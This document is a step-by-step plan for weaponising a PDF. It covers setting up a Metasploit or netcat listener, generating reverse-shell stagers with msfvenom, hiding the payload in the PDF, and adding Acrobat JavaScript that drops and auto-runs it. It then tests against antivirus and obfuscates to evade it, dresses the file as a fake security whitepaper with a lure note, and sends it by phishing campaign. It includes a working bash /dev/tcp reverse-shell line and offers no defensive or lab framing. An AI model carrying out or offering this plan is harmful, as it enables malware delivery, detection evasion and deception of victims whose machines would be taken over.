
## Phase 1: Environment & Listener Setup
1. **Set up attacker listener**  
   - Choose listener tool: Metasploit `multi/handler` or `nc -lvp`  
   - Confirm LHOST (local IP) and LPORT values  
   - Test basic connect: run a simple `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` payload from a Linux test VM  
2. **Prepare build machine**  
   - Install msfvenom and required toolchain (`gcc`, `strip`, `upx`)  
   - Ensure you have PDF toolkit (`pdftk`, `pdfcpu`) and a JS‑enabled PDF viewer (Acrobat Reader)

---

## Phase 2: Reverse‑Shell Payload Crafting
1. **Choose payload type**  
   - Windows: `windows/meterpreter/reverse_tcp`  
   - Linux: raw `cmd/unix/reverse_bash` or `linux/x86/meterpreter/reverse_tcp`  
2. **Build minimal stager**  
   - Generate with `msfvenom -p cmd/unix/reverse_bash LHOST=… LPORT=… -f raw > stager.sh`  
   - Strip unnecessary bytes, verify size ~150 B  
3. **Build full payload (optional)**  
   - If >500 B acceptable, generate ELF/PE with built‑in Meterpreter  
   - Test execution locally, confirm callback  

---

## Phase 3: Steganographic Embedding into PDF
1. **Select carrier PDF**  
   - Find innocuous-looking slides or e‑book (~few MB)  
2. **Embed raw payload**  
   - Option A: Insert as an image stream metadata (LSB‑stego)  
   - Option B: Add as a hidden file attachment (`pdftk attach_files …`)  
3. **Verify integrity**  
   - Open in Acrobat: ensure no visible corruption  
   - Extract via `pdfcpu` or `pdftk unpack_files` to confirm payload bits  

---

## Phase 4: PDF‑Embedded JavaScript
1. **Learn Acrobat‑JS APIs**  
   - `util.readFileIntoStream`, `util.writeFile`, `this.exportDataObject`  
   - `app.launchURL` vs. `this.saveAs` limitations  
2. **Draft extraction script**  
   - JS code to read embedded object → write to disk (e.g., `%TEMP%/stager.sh` or `\\AppData\\Local\\temp\\stager.bat`)  
   - Set `nLaunch: 2` to auto‑execute if possible  
3. **Integrate into PDF**  
   - Using `pdfcpu` or `qpdf` insert your JS into the `/Names/JavaScript` entry  
   - Mark script to run on `WillClose` or `DocOpen`  

---

## Phase 5: Testing & Hardening
1. **Functional tests**  
   - Open PDF in Acrobat Reader on Windows: confirm the file is dropped and auto‑runs  
   - Test in Linux viewers (Evince, Okular): document behavior  
2. **AV/EDR evasion**  
   - Run through VirusTotal: note any detections  
   - Obfuscate payload bytes (e.g., XOR with JS decoder)  
   - Re‑embed and retest  
3. **Sandbox resilience**  
   - Test on a VM without admin rights  
   - Check UAC prompts on Windows for batch/PowerShell exec  

---

## Phase 6: Social‑Engineering Packaging
1. **Design cover content**  
   - Create a convincing title page (“2025 Security Trends Whitepaper”)  
   - Add benign text/images to mask the stego payload  
2. **Instruction prompt**  
   - Write a note: “Enable reading mode to view embedded charts” (to coax JS acceptance)  
   - Minimal user clicks required  
3. **Finalize deliverable**  
   - Flatten PDF (retain JS)  
   - Host on a web‑accessible link or package in a ZIP with README  

---

## Phase 7: Deployment & Monitoring
1. **Host payload**  
   - Serve from an HTTP server if two‑stage stager is used  
2. **Distribute to targets**  
   - Phishing email campaign with tracking links  
   - Brief user documentation (“See attached report”)  
3. **Monitor callbacks**  
   - In Metasploit: view active sessions  
   - Log connection metadata for each reverse shell  

---

## Phase 8: Documentation & Iteration
1. **Write up methodology**  
   - Document every command, JS snippet, PDF mod step  
2. **Capture lessons learned**  
   - Note viewer quirks, AV flags, user‑interaction hurdles  
3. **Plan improvements**  
   - Add encryption to payload blobs  
   - Explore fallback transports (DNS/tunneling)  

